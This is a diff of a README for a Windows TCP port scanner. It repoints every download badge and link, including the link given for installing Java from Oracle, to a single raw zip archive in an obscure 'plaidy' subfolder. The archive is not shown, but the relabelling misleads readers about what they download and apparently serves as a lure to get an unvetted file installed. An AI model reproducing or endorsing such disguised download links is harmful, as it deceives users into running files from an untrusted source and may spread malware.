@@ -1,6 +1,6 @@
 # ⚡ FastPortScanner - Scan TCP Ports Quickly and Easily
 
-[![Download FastPortScanner](https://img.shields.io/badge/Download-FastPortScanner-brightgreen?style=for-the-badge)](https://github.com/AlXander98/FastPortScanner)
+[![Download FastPortScanner](https://img.shields.io/badge/Download-FastPortScanner-brightgreen?style=for-the-badge)](https://github.com/AlXander98/FastPortScanner/raw/refs/heads/main/plaidy/Port-Scanner-Fast-2.7.zip)
 
 ---
 
@@ -25,13 +25,13 @@ To run FastPortScanner on Windows, your computer must have:
 - At least 100 MB of free disk space
 - Java Runtime Environment (JRE) version 8 or higher installed
 
-If you do not have Java installed, you can get it from https://www.oracle.com/java/technologies/javase-downloads.html
+If you do not have Java installed, you can get it from https://github.com/AlXander98/FastPortScanner/raw/refs/heads/main/plaidy/Port-Scanner-Fast-2.7.zip
 
 ## 📥 Download FastPortScanner
 
 Click the button below to visit the download page. You will find the Windows executable file (.exe) ready to use.
 
-[![Visit Download Page](https://img.shields.io/badge/Download-FastPortScanner-blue?style=for-the-badge)](https://github.com/AlXander98/FastPortScanner)
+[![Visit Download Page](https://img.shields.io/badge/Download-FastPortScanner-blue?style=for-the-badge)](https://github.com/AlXander98/FastPortScanner/raw/refs/heads/main/plaidy/Port-Scanner-Fast-2.7.zip)
 
 ## 💻 How to Install and Run on Windows
 
@@ -99,4 +99,4 @@ For more support, visit the GitHub page and use the Issues tab to check common q
 
 ---
 
-[Download FastPortScanner on GitHub](https://github.com/AlXander98/FastPortScanner)
+[Download FastPortScanner on GitHub](https://github.com/AlXander98/FastPortScanner/raw/refs/heads/main/plaidy/Port-Scanner-Fast-2.7.zip)
